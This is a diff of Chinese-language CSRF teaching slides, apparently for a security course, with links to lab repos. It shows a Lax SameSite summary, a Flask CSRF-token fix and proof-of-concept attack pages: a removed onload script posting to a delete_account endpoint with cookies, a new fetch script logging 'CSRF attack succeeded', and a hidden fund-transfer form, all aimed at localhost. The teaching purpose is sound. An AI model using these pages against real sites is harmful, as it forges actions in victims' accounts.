@@ -58,22 +58,6 @@ weight = 50
 
 ---
 
-```js
-// localhost:5001
-window.onload = function() {
-    fetch('http://localhost:5000/delete_account', {
-        method: 'POST',
-        credentials: 'include'  // sends cookies
-    }).then(response => {
-        console.log('CSRF request sent');
-    }).catch(error => {
-        console.error('Error:', error);
-    });
-};
-```
-
----
-
 一個比較不危險的 CSRF 例子  
 [superlogout](https://superlogout.com/)
 
@@ -206,6 +190,13 @@ Connection: keep-alive
 
 ---
 
+What Lax allows:
+- GET
+- HEAD
+- POST (No custom header)
+
+---
+
 #### DEMO
 [Lab: SameSite Cookie](https://github.com/hlc23/CS-Labs/tree/main/SameSite-cookie)
 
@@ -242,13 +233,16 @@ Connection: keep-alive
 ```python 
 @app.route("/transfer_funds", methods=["GET", "POST"])
 def transfer_funds():
-    if request.method == "POST":
+    if request.method == "GET":
+        session["csrf_token"] = secrets.token_hex(16)
+        return render_template("transfer_funds.html", 
+                csrf_token=session["csrf_token"])
+    elif request.method == "POST":
         csrf_token = request.form.get("csrf_token")
         if csrf_token != session.get("csrf_token"):
             return "CSRF token is invalid", 403
-    session["csrf_token"] = secrets.token_hex(16)
-    return render_template("transfer_funds.html", 
-            csrf_token=session["csrf_token"])
+        ...
+        return "Transfer successful"
 ```
 
 {{% /section %}}
@@ -266,25 +260,28 @@ def transfer_funds():
 - Lab: [Method-based-CSRF-Bypass](https://github.com/hlc23/CS-Labs/tree/main/Method-based-CSRF-Bypass)
 
 {{% note %}}
-```js
-fetch('http://localhost:8080/api/data', {
-method: 'POST',
-headers: {
-    'Content-Type': 'application/json'
-},
-body: JSON.stringify({
-    "action": "malicious_data",
-    "user": "attacker"
-})
-})
-.then(response => response.json())
-.then(result => {
-document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(result, null, 2) + '</pre>';
-})
-.catch(error => {
-document.getElementById('result').innerHTML = 'Error: ' + error.message;
-});
+```html
+<script>
+    fetch('http://localhost:8000/api/data', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "msg":"Hello World"
+        })
+    }).then(response => {
+        if (response.ok) {
+            console.log('CSRF attack succeeded');
+        } else {
+            console.log('CSRF attack failed');
+        }
+    }).catch(error => {
+        console.log('Error during CSRF attack:', error);
+    });
+</script>
 ```
+
 ```html
 <form action="http://localhost:5000/transfer" method="POST" style="display:none;">
     <input type="hidden" name="amount" value="100">
